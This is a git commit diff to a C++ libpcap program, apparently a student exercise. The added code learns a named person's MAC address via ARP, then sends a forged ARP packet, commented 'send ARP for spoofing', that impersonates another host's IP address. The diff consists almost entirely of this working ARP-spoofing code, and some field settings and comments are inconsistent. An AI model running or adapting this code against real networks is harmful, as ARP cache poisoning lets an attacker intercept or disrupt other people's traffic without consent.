9a89562a4ea361c58ca6546c478c8804ed3dd17b
ChoChiMoo <eddyojh@gmailcom>
2024-08-14 23:14:01 +0900

    feat: Add yejun_mac

--- src/main.cpp
+++ src/main.cpp
@@ -57,12 +57,15 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
+	struct pcap_pkthdr* header;
+    const u_char* reply_packet;
+    Mac yejun_mac;
 
 
 	EthArpPacket packet;
 
 	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");	//broadcast
-	packet.eth_.smac_ = Mac(get_my_mac(dev));	//mymac
+	packet.eth_.smac_ = Mac(get_my_mac(dev));		//mymac
 	packet.eth_.type_ = htons(EthHdr::Arp);
 
 	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -75,10 +78,59 @@ int main(int argc, char* argv[]) {
 	packet.arp_.tmac_ = Mac(get_my_mac(dev));	//mymac
 	packet.arp_.tip_ = htonl(Ip(target_ipstr));		//gateway
 
+	// send ARP to get goyejun MAC
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	}
+
+	// wait for reply
+	while (true) {
+        int ret = pcap_next_ex(handle, &header, &reply_packet);
+        if (ret == 1) {
+            const EthArpPacket* recv_packet = reinterpret_cast<const EthArpPacket*>(reply_packet);
+
+            // ARP Reply 확인
+            if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
+                ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
+                (recv_packet->arp_.sip_) == htonl(Ip(target_ipstr))) {
+                yejun_mac = recv_packet->arp_.smac_;
+                break;
+            }
+        } else if (ret == -1) {
+            fprintf(stderr, "pcap_next_ex return %d(%s)\n", ret, pcap_geterr(handle));
+            pcap_close(handle);
+            return -1;
+        }
+    }
+
+	packet.eth_.dmac_ = yejun_mac;	//broadcast
+	packet.eth_.smac_ = Mac(get_my_mac(dev));		//mymac
+	packet.eth_.type_ = htons(EthHdr::Arp);
+
+	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
+	packet.arp_.pro_ = htons(EthHdr::Ip4);
+	packet.arp_.hln_ = Mac::SIZE;
+	packet.arp_.pln_ = Ip::SIZE;
+	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.smac_ = Mac("00:00:00:00:00:00");	//goyejun
+	packet.arp_.sip_ = htonl(Ip(sender_ipstr));		//goyejun
+	packet.arp_.tmac_ = Mac(get_my_mac(dev));		//mymac
+	packet.arp_.tip_ = htonl(Ip(target_ipstr));		//gateway
+
+
+	// send ARP for spoofing
+	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+    if (res != 0) {
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    }
+
+    pcap_close(handle);
+    return 0;
+
+
+
+
 
 	pcap_close(handle);
 }
